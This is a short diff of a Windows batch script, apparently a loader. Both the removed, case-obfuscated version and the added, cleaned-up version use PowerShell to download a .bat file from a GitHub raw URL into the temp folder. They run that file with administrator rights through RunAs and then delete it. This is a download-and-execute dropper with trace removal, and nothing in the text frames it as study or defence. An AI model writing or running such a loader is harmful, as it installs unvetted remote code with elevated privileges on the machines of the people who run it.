@@ -1,8 +1,14 @@
 @echo off
-sEtLoCaL
-sEt "tEMPfIlE=%tEMp%\BBd4_sUpPoRT.bAT"
-PoWErShElL -CoMmAnD "InVoKe-WeBrEqUeSt 'https://raw.githubusercontent.com/Pikinez/DataBase/main/BBD4_Support.bat' -OuTfIlE '%tEMpFIlE%'"
-IF EXiSt "%TEmPFIlE%" (PoWERshELL -ComMAnd "StArT-PrOcEsS '%TeMpFiLe%' -vErB rUnAs -WaIT")
-Del /F /Q "%TeMpFIlE%"
-EnDlOCaL
-ExIT
+setlocal
+set "tempFile=%temp%\BBD4_Support.bat"
+if exist "%tempFile%" (
+    del /f /q "%tempFile%"
+    echo Old BBD4_Support.bat was deleted.
+)
+PowerShell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Pikinez/DataBase/main/BBD4_Support.bat' -OutFile '%tempFile%'"
+if exist "%tempFile%" (
+    PowerShell -Command "Start-Process '%tempFile%' -Verb RunAs -Wait"
+)
+del /f /q "%tempFile%"
+endlocal
+exit
